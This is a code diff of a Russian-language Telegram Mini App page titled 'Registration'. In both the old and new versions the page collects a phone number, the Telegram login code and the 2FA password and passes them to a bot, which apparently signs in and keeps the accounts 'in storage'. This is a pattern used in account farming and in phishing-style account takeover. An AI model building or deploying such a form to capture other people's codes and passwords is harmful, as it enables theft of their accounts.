@@ -1,389 +1,230 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Registration</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
-            padding: 20px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            width: 100%;
-            flex: 1;
-        }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            text-align: center;
-            color: var(--tg-theme-text-color, #000000);
-        }
-        .step {
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-        .step.active {
-            display: block;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 5px;
-            color: var(--tg-theme-text-color, #000000);
-        }
-        input, textarea {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid var(--tg-theme-hint-color, #cccccc);
-            border-radius: 8px;
-            font-size: 16px;
-            background: var(--tg-theme-secondary-bg-color, #f5f5f5);
-            color: var(--tg-theme-text-color, #000000);
-            box-sizing: border-box;
-        }
-        input:focus, textarea:focus {
-            outline: none;
-            border-color: var(--tg-theme-button-color, #0088cc);
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background: var(--tg-theme-button-color, #0088cc);
-            color: var(--tg-theme-button-text-color, #ffffff);
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: opacity 0.2s;
-            margin-top: 10px;
-        }
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        button.secondary {
-            background: var(--tg-theme-secondary-bg-color, #e0e0e0);
-            color: var(--tg-theme-text-color, #000000);
-        }
-        .iframe-container {
-            width: 100%;
-            height: 500px;
-            border: 1px solid var(--tg-theme-hint-color, #cccccc);
-            border-radius: 8px;
-            overflow: hidden;
-            margin: 15px 0;
-            background: #ffffff;
-        }
-        .iframe-container iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        .status {
-            padding: 12px;
-            border-radius: 8px;
-            margin: 10px 0;
-            font-size: 14px;
-            text-align: center;
-        }
-        .status.success {
-            background: #d4edda;
-            color: #155724;
-        }
-        .status.error {
-            background: #f8d7da;
-            color: #721c24;
-        }
-        .status.info {
-            background: #cce5ff;
-            color: #004085;
-        }
-        .status.hidden {
-            display: none;
-        }
-        .code-display {
-            font-size: 24px;
-            font-weight: bold;
-            text-align: center;
-            padding: 20px;
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            border-radius: 8px;
-            margin: 10px 0;
-            letter-spacing: 4px;
-            font-family: 'Courier New', monospace;
-        }
-        .flex {
-            display: flex;
-            gap: 10px;
-        }
-        .flex button {
-            flex: 1;
-        }
-        .note {
-            font-size: 13px;
-            color: var(--tg-theme-hint-color, #888888);
-            margin-top: 10px;
-            text-align: center;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Регистрация</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: var(--tg-theme-bg-color, #101014);
+      color: var(--tg-theme-text-color, #ffffff);
+    }
+
+    main {
+      width: min(480px, 100%);
+      margin: 0 auto;
+      padding: 18px;
+    }
+
+    h1 {
+      margin: 8px 0 18px;
+      font-size: 22px;
+      line-height: 1.2;
+    }
+
+    .panel {
+      padding: 14px;
+      border: 1px solid var(--tg-theme-hint-color, #3a3a42);
+      border-radius: 8px;
+      background: var(--tg-theme-secondary-bg-color, #1b1b22);
+      margin-bottom: 12px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      color: var(--tg-theme-hint-color, #a5a5ad);
+      font-size: 13px;
+    }
+
+    input {
+      width: 100%;
+      height: 46px;
+      padding: 0 12px;
+      border: 1px solid var(--tg-theme-hint-color, #3a3a42);
+      border-radius: 8px;
+      background: var(--tg-theme-bg-color, #101014);
+      color: var(--tg-theme-text-color, #ffffff);
+      font-size: 16px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: var(--tg-theme-button-color, #2ea6ff);
+    }
+
+    button {
+      width: 100%;
+      min-height: 46px;
+      border: 0;
+      border-radius: 8px;
+      padding: 0 12px;
+      background: var(--tg-theme-button-color, #2ea6ff);
+      color: var(--tg-theme-button-text-color, #ffffff);
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    button.secondary {
+      background: var(--tg-theme-secondary-bg-color, #24242c);
+      color: var(--tg-theme-text-color, #ffffff);
+      border: 1px solid var(--tg-theme-hint-color, #3a3a42);
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 10px;
+    }
+
+    .muted {
+      margin-top: 8px;
+      color: var(--tg-theme-hint-color, #a5a5ad);
+      font-size: 13px;
+      line-height: 1.35;
+    }
+
+    .status {
+      display: none;
+      margin: 12px 0;
+      padding: 10px 12px;
+      border-radius: 8px;
+      background: rgba(46, 166, 255, 0.14);
+      color: var(--tg-theme-text-color, #ffffff);
+      font-size: 14px;
+      line-height: 1.35;
+    }
+
+    .status.visible {
+      display: block;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>📱 Регистрация аккаунта</h1>
+  <main>
+    <h1>Регистрация аккаунта</h1>
 
-        <!-- Шаг 1: Ввод номера -->
-        <div id="step-phone" class="step active">
-            <div class="input-group">
-                <label>Номер телефона</label>
-                <input type="text" id="phone-input" placeholder="+998901234567" value="">
-            </div>
-            <button id="btn-start-reg">Начать регистрацию</button>
-            <div class="note">Введите номер в формате +998901234567</div>
-        </div>
-
-        <!-- Шаг 2: Ожидание капчи -->
-        <div id="step-captcha" class="step">
-            <div class="status info" id="status-msg">⏳ Открываем страницу Telegram...</div>
-            <div class="iframe-container">
-                <iframe id="tg-iframe" src="https://web.telegram.org"></iframe>
-            </div>
-            <button id="btn-captcha-done">✅ Я прошёл капчу</button>
-            <button id="btn-captcha-retry" class="secondary">🔄 Открыть заново</button>
-            <div class="note">1. Введите номер в Telegram<br>2. Пройдите капчу<br>3. Нажмите "Я прошёл капчу"</div>
-        </div>
-
-        <!-- Шаг 3: Ввод кода -->
-        <div id="step-code" class="step">
-            <div class="status info">📩 Код отправлен на Telegram</div>
-            <div class="input-group">
-                <label>Код подтверждения</label>
-                <input type="text" id="code-input" placeholder="Введите код из Telegram" maxlength="8">
-            </div>
-            <button id="btn-submit-code">✅ Подтвердить код</button>
-            <button id="btn-resend-code" class="secondary">🔄 Отправить код повторно</button>
-            <div class="note">Код должен быть 5-8 цифр</div>
-        </div>
-
-        <!-- Шаг 4: 2FA (если нужно) -->
-        <div id="step-twofa" class="step">
-            <div class="status info">🔐 Требуется двухфакторный пароль</div>
-            <div class="input-group">
-                <label>Пароль 2FA</label>
-                <input type="password" id="twofa-input" placeholder="Введите пароль 2FA">
-            </div>
-            <button id="btn-submit-twofa">✅ Отправить пароль</button>
-        </div>
-
-        <!-- Шаг 5: Готово -->
-        <div id="step-done" class="step">
-            <div class="status success">✅ Аккаунт успешно зарегистрирован!</div>
-            <div id="done-info" style="margin: 15px 0; text-align: center;"></div>
-            <button id="btn-close">Закрыть</button>
-        </div>
+    <div class="panel">
+      <label for="phone">Номер телефона</label>
+      <input id="phone" inputmode="tel" autocomplete="tel" placeholder="+998901234567">
+      <div class="muted">Бот ответит результатом в чат Telegram.</div>
     </div>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
+    <div class="panel grid">
+      <button id="send-phone">Запросить код</button>
+      <button id="close" class="secondary">Закрыть</button>
+    </div>
 
-        // Элементы
-        const steps = {
-            phone: document.getElementById('step-phone'),
-            captcha: document.getElementById('step-captcha'),
-            code: document.getElementById('step-code'),
-            twofa: document.getElementById('step-twofa'),
-            done: document.getElementById('step-done'),
-        };
+    <div class="panel">
+      <label for="code">Код подтверждения</label>
+      <input id="code" inputmode="numeric" autocomplete="one-time-code" placeholder="12345" maxlength="8">
+      <div class="grid" style="margin-top: 10px;">
+        <button id="send-code">Отправить код</button>
+        <button id="resend-code" class="secondary">Другой способ / повтор</button>
+      </div>
+    </div>
 
-        const phoneInput = document.getElementById('phone-input');
-        const codeInput = document.getElementById('code-input');
-        const twofaInput = document.getElementById('twofa-input');
-        const iframe = document.getElementById('tg-iframe');
-        const statusMsg = document.getElementById('status-msg');
+    <div class="panel">
+      <label for="twofa">Пароль 2FA</label>
+      <input id="twofa" type="password" autocomplete="current-password" placeholder="Если Telegram попросил пароль">
+      <div class="grid" style="margin-top: 10px;">
+        <button id="send-twofa">Отправить 2FA</button>
+      </div>
+    </div>
 
-        let currentStep = 'phone';
-        let phone = '';
-        let sessionData = {};
+    <div id="status" class="status"></div>
+  </main>
 
-        function showStep(stepName) {
-            Object.keys(steps).forEach(key => {
-                steps[key].classList.toggle('active', key === stepName);
-            });
-            currentStep = stepName;
-        }
+  <script>
+    const tg = window.Telegram.WebApp;
+    const phoneInput = document.getElementById("phone");
+    const codeInput = document.getElementById("code");
+    const twofaInput = document.getElementById("twofa");
+    const statusBox = document.getElementById("status");
 
-        // Шаг 1: Начать регистрацию
-        document.getElementById('btn-start-reg').addEventListener('click', function() {
-            phone = phoneInput.value.trim();
-            if (!phone || !phone.match(/^\+\d{10,15}$/)) {
-                tg.showAlert('Введите корректный номер в формате +998901234567');
-                return;
-            }
-            
-            // Отправляем номер в бот
-            tg.sendData(JSON.stringify({
-                action: 'register_start',
-                phone: phone
-            }));
+    tg.ready();
+    tg.expand();
 
-            // Показываем шаг с капчей
-            showStep('captcha');
-            statusMsg.textContent = '⏳ Открываем Telegram. Введите номер и пройдите капчу.';
-            iframe.src = 'https://web.telegram.org';
-        });
+    phoneInput.value = localStorage.getItem("grinreg_phone") || "";
 
-        // Шаг 2: Пройти капчу
-        document.getElementById('btn-captcha-done').addEventListener('click', function() {
-            statusMsg.textContent = '⏳ Проверяем...';
-            tg.sendData(JSON.stringify({
-                action: 'captcha_done',
-                phone: phone
-            }));
-        });
+    function showStatus(text) {
+      statusBox.textContent = text;
+      statusBox.classList.add("visible");
+    }
 
-        // Обновить iframe
-        document.getElementById('btn-captcha-retry').addEventListener('click', function() {
-            iframe.src = 'https://web.telegram.org';
-            statusMsg.textContent = '🔄 Страница обновлена. Попробуйте ещё раз.';
-        });
+    function normalizePhone(value) {
+      const trimmed = value.trim();
+      if (trimmed.startsWith("+")) {
+        return "+" + trimmed.replace(/\D/g, "");
+      }
+      return "+" + trimmed.replace(/\D/g, "");
+    }
 
-        // Шаг 3: Отправить код
-        document.getElementById('btn-submit-code').addEventListener('click', function() {
-            const code = codeInput.value.trim();
-            if (!code || code.length < 5) {
-                tg.showAlert('Введите код (5-8 цифр)');
-                return;
-            }
-            tg.sendData(JSON.stringify({
-                action: 'submit_code',
-                phone: phone,
-                code: code
-            }));
-        });
+    function currentPhone() {
+      const phone = normalizePhone(phoneInput.value);
+      if (!/^\+\d{8,15}$/.test(phone)) {
+        tg.showAlert("Введите номер с кодом страны, например +998901234567");
+        return null;
+      }
+      localStorage.setItem("grinreg_phone", phone);
+      phoneInput.value = phone;
+      return phone;
+    }
 
-        // Повторно отправить код
-        document.getElementById('btn-resend-code').addEventListener('click', function() {
-            tg.sendData(JSON.stringify({
-                action: 'resend_code',
-                phone: phone
-            }));
-            tg.showAlert('Запрос на повторную отправку кода отправлен');
-        });
+    function send(action, payload) {
+      tg.sendData(JSON.stringify({ action, ...payload }));
+    }
 
-        // Шаг 4: Отправить 2FA
-        document.getElementById('btn-submit-twofa').addEventListener('click', function() {
-            const password = twofaInput.value.trim();
-            if (!password) {
-                tg.showAlert('Введите пароль 2FA');
-                return;
-            }
-            tg.sendData(JSON.stringify({
-                action: 'submit_twofa',
-                phone: phone,
-                password: password
-            }));
-        });
+    document.getElementById("send-phone").addEventListener("click", () => {
+      const phone = currentPhone();
+      if (!phone) return;
+      send("register_start", { phone });
+      showStatus("Запрос отправлен. Ответ придёт сообщением от бота.");
+    });
 
-        // Закрыть
-        document.getElementById('btn-close').addEventListener('click', function() {
-            tg.close();
-        });
+    document.getElementById("send-code").addEventListener("click", () => {
+      const phone = currentPhone();
+      const code = codeInput.value.replace(/\D/g, "");
+      if (!phone) return;
+      if (code.length < 5 || code.length > 8) {
+        tg.showAlert("Код должен быть длиной 5-8 цифр");
+        return;
+      }
+      send("submit_code", { phone, code });
+      showStatus("Код отправлен боту. Проверьте ответ в чате.");
+    });
 
-        // Обработка данных от бота
-        tg.onEvent('mainButtonClicked', function() {
-            // Игнорируем
-        });
+    document.getElementById("resend-code").addEventListener("click", () => {
+      const phone = currentPhone();
+      if (!phone) return;
+      send("resend_code", { phone });
+      showStatus("Запрос повтора отправлен. Проверьте ответ в чате.");
+    });
 
-        // Показываем уведомления
-        window.showAlert = function(message) {
-            tg.showAlert(message);
-        };
+    document.getElementById("send-twofa").addEventListener("click", () => {
+      const phone = currentPhone();
+      const password = twofaInput.value.trim();
+      if (!phone) return;
+      if (!password) {
+        tg.showAlert("Введите пароль 2FA");
+        return;
+      }
+      send("submit_twofa", { phone, password });
+      showStatus("Пароль отправлен боту. Проверьте ответ в чате.");
+    });
 
-        // Получение данных от бота через Telegram.WebApp
-        window.handleWebAppData = function(data) {
-            try {
-                const parsed = JSON.parse(data);
-                console.log('Received from bot:', parsed);
-
-                switch (parsed.action) {
-                    case 'code_sent':
-                        showStep('code');
-                        if (parsed.message) {
-                            tg.showAlert(parsed.message);
-                        }
-                        break;
-
-                    case 'twofa_required':
-                        showStep('twofa');
-                        break;
-
-                    case 'login_success':
-                        showStep('done');
-                        document.getElementById('done-info').innerHTML = `
-                            <p>✅ Аккаунт добавлен в хранилище</p>
-                            <p>📱 Телефон: <b>${parsed.phone || '-'}</b></p>
-                            <p>🆔 ID: <b>${parsed.account_id || '—'}</b></p>
-                        `;
-                        break;
-
-                    case 'error':
-                        tg.showAlert('❌ Ошибка: ' + (parsed.message || 'Неизвестная ошибка'));
-                        break;
-
-                    case 'captcha_required':
-                        showStep('captcha');
-                        statusMsg.textContent = '⚠️ Требуется капча. Пройдите её в Telegram.';
-                        break;
-
-                    default:
-                        console.log('Unknown action:', parsed.action);
-                }
-            } catch (e) {
-                console.error('Error parsing data:', e);
-            }
-        };
-
-        // Инициализация
-        showStep('phone');
-
-        // Обработка данных от бота через параметр
-        const urlParams = new URLSearchParams(window.location.search);
-        const initData = urlParams.get('webAppData');
-        if (initData) {
-            try {
-                const data = JSON.parse(decodeURIComponent(initData));
-                window.handleWebAppData(JSON.stringify(data));
-            } catch (e) {
-                console.error('Failed to parse init data:', e);
-            }
-        }
-
-        // Telegram WebApp готов
-        tg.ready();
-        tg.enableClosingConfirmation();
-    </script>
+    document.getElementById("close").addEventListener("click", () => {
+      tg.close();
+    });
+  </script>
 </body>
 </html>
